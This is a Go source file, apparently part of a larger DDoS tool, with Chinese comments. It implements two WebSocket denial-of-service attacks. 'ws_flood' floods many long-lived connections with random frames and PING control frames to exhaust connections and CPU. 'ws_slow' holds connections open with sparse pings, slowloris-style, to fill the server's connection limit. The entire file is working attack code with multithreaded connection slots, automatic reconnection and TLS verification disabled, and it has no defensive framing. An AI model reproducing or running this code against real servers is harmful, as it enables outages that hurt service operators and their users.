package attack

import (
	"crypto/tls"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
)

// ============================================================
// WebSocket 攻击：
//   - ws_flood：批量建立真实 WS 长连接，已建立连接上循环发送消息帧
//     + PING 控制帧（目标必须回 PONG，协议强制 2x 帧放大）——打目标
//     连接数 + 消息处理 CPU 双维度。长连接复用，帧率不受 RTT 限制。
//   - ws_slow：建立连接后不发数据占坑（周期性 PING 保活）——连接耗尽型，
//     WS 服务器的连接数上限通常远小于 HTTP（几十~几千），极易打满；
//     与 slowloris 同性质但针对 WS 协议。
// 目标 URL：ws://host/path 或 wss://（https:// 自动转 wss，http:// 转 ws）。
// ============================================================

// wsSlotsPerThread 每线程连接槽数
const wsSlotsPerThread = 8

// StartWSFloodEx WebSocket 消息洪泛
func StartWSFloodEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "ws_flood", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	runWSLoop(s, cfg, false)
	return s
}

// StartWSSlowEx WebSocket 连接占坑
func StartWSSlowEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "ws_slow", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	runWSLoop(s, cfg, true)
	return s
}

// runWSLoop 共享循环：slowMode=true 只占坑（周期 PING 保活），
// false 则消息 + PING 洪泛。
func runWSLoop(s *AttackSession, cfg AttackConfig, slowMode bool) {
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 20
	}

	targets := resolveTargetStrings(cfg)
	if len(targets) == 0 {
		s.abort()
		return
	}
	msgSize := cfg.PacketSize
	if msgSize < 1 || msgSize > 65507 {
		msgSize = 64
	}

	dialer := &websocket.Dialer{
		HandshakeTimeout: 5 * time.Second,
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()
				rng := NewFastRNG(time.Now().UnixNano() + seed)
				endTime := time.Now().Add(dur)
				var targetIdx uint64

				var slotWG sync.WaitGroup
				for slot := 0; slot < wsSlotsPerThread; slot++ {
					slotWG.Add(1)
					go func() {
						defer slotWG.Done()
						tc := newTimeCache()
						var conn *websocket.Conn
						var msg []byte

						// 拨号/重连：失败退避，绝不退出
						ensureConn := func() bool {
							if conn != nil {
								return true
							}
							tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
							wsURL := toWSURL(tgt)
							if wsURL == "" {
								atomic.AddUint64(&s.Stats.Errors, 1)
								time.Sleep(time.Second)
								return false
							}
							c, _, err := dialer.Dial(wsURL, nil)
							if err != nil {
								atomic.AddUint64(&s.Stats.Errors, 1)
								time.Sleep(100 * time.Millisecond)
								return false
							}
							conn = c
							if !slowMode {
								msg = make([]byte, msgSize)
							}
							return true
						}

						for tc.since(endTime) < 0 {
							select {
							case <-s.StopChan:
								if conn != nil {
									conn.Close()
								}
								return
							default:
							}

							if !ensureConn() {
								continue
							}
							if !s.checkRate(64) {
								time.Sleep(time.Microsecond * 100)
								continue
							}

							conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
							if slowMode {
								// ws_slow：不发消息，仅周期 PING 保活（30s 间隔，
								// 目标协议强制回 PONG，同时刷新服务端 idle 计时）
								select {
								case <-s.StopChan:
									conn.Close()
									return
								case <-time.After(30 * time.Second):
								}
								if tc.since(endTime) >= 0 {
									conn.Close()
									return
								}
								conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
								if err := conn.WriteControl(websocket.PingMessage, nil, time.Now().Add(3*time.Second)); err != nil {
									conn.Close()
									conn = nil
									atomic.AddUint64(&s.Stats.Errors, 1)
									continue
								}
								atomic.AddUint64(&s.Stats.PacketsSent, 1)
								atomic.AddUint64(&s.Stats.BytesSent, 2)
								tc.refresh()
								continue
							}

							// ws_flood：随机消息帧 + 周期 PING（每 8 帧一次）
							rng.Read(msg)
							var err error
							if rng.Intn(8) == 0 {
								err = conn.WriteControl(websocket.PingMessage, nil, time.Now().Add(3*time.Second))
							} else {
								if rng.Intn(4) == 0 {
									err = conn.WriteMessage(websocket.BinaryMessage, msg)
								} else {
									err = conn.WriteMessage(websocket.TextMessage, msg)
								}
							}
							if err != nil {
								conn.Close()
								conn = nil
								atomic.AddUint64(&s.Stats.Errors, 1)
								continue
							}
							atomic.AddUint64(&s.Stats.PacketsSent, 1)
							atomic.AddUint64(&s.Stats.BytesSent, uint64(msgSize))
							tc.refresh()
						}
						if conn != nil {
							conn.Close()
						}
					}()
				}
				slotWG.Wait()
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()
}

// toWSURL 把目标串转成 ws:// 或 wss:// URL
func toWSURL(tgt string) string {
	tgt = strings.TrimSpace(tgt)
	if tgt == "" {
		return ""
	}
	switch {
	case strings.HasPrefix(tgt, "ws://"), strings.HasPrefix(tgt, "wss://"):
		return tgt
	case strings.HasPrefix(tgt, "https://"):
		return "wss://" + strings.TrimPrefix(tgt, "https://")
	case strings.HasPrefix(tgt, "http://"):
		return "ws://" + strings.TrimPrefix(tgt, "http://")
	}
	// 无 scheme：默认 ws://，但保留路径
	if _, err := url.Parse("ws://" + tgt); err != nil {
		return ""
	}
	return "ws://" + tgt
}
